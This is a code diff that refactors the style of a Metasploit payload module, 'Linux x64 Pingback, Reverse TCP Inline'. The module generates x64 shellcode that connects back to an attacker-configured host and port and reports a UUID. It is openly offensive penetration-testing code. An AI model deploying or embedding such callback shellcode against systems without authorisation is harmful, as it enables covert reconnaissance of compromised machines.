@@ -3,10 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-
 module MetasploitModule
-
   CachedSize = 125
 
   include Msf::Payload::Linux::X64::Prepends
@@ -15,31 +12,36 @@ module MetasploitModule
   include Msf::Payload::Pingback::Options
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Linux x64 Pingback, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and report UUID (Linux x64)',
-      'Author'        => [ 'bwatters-r7' ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'linux',
-      'Arch'          => ARCH_X64,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::Pingback
-    ))
-    def generate(opts={})
-      # 22 -> "0x00,0x16"
-      # 4444 -> "0x11,0x5c"
-      encoded_port = [datastore['LPORT'].to_i,2].pack("vn").unpack("N").first
-      encoded_host = Rex::Socket.addr_aton(datastore['LHOST']||"127.127.127.127").unpack("V").first
-      encoded_host_port = "0x%.8x%.8x" % [encoded_host, encoded_port]
-      retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max
+    super(
+      merge_info(
+        info,
+        'Name' => 'Linux x64 Pingback, Reverse TCP Inline',
+        'Description' => 'Connect back to attacker and report UUID (Linux x64)',
+        'Author' => [ 'bwatters-r7' ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'linux',
+        'Arch' => ARCH_X64,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::Pingback
+      )
+    )
+  end
 
-      self.pingback_uuid ||= self.generate_pingback_uuid
-      uuid_as_db = "0x" + self.pingback_uuid.chars.each_slice(2).map(&:join).join(",0x")
-      seconds = 5.0
-      sleep_seconds = seconds.to_i
-      sleep_nanoseconds = (seconds % 1 * 1_000_000_000).to_i
+  def generate(_opts = {})
+    # 22 -> "0x00,0x16"
+    # 4444 -> "0x11,0x5c"
+    encoded_port = [datastore['LPORT'].to_i, 2].pack('vn').unpack('N').first
+    encoded_host = Rex::Socket.addr_aton(datastore['LHOST'] || '127.127.127.127').unpack('V').first
+    encoded_host_port = format('0x%<encoded_host>.8x%<encoded_port>.8x', { encoded_host: encoded_host, encoded_port: encoded_port })
+    retry_count = [datastore['ReverseConnectRetries'].to_i, 1].max
 
-      asm = %Q^
+    self.pingback_uuid ||= generate_pingback_uuid
+    uuid_as_db = '0x' + self.pingback_uuid.chars.each_slice(2).map(&:join).join(',0x')
+    seconds = 5.0
+    sleep_seconds = seconds.to_i
+    sleep_nanoseconds = (seconds % 1 * 1_000_000_000).to_i
+
+    asm = %^
         push   #{retry_count}        ; retry counter
         pop    r9
         push   rsi
@@ -95,7 +97,7 @@ module MetasploitModule
         syscall ; exit(1)
 
       send_pingback:
-        push #{uuid_as_db.split(",").length} ; length of the PINGBACK UUID
+        push #{uuid_as_db.split(',').length} ; length of the PINGBACK UUID
         pop rdx
         call get_uuid_address         ; put uuid buffer on the stack
         db #{uuid_as_db}  ; PINGBACK_UUID
@@ -108,7 +110,6 @@ module MetasploitModule
 
       jmp failed
       ^
-      Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
-    end
+    Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
   end
 end
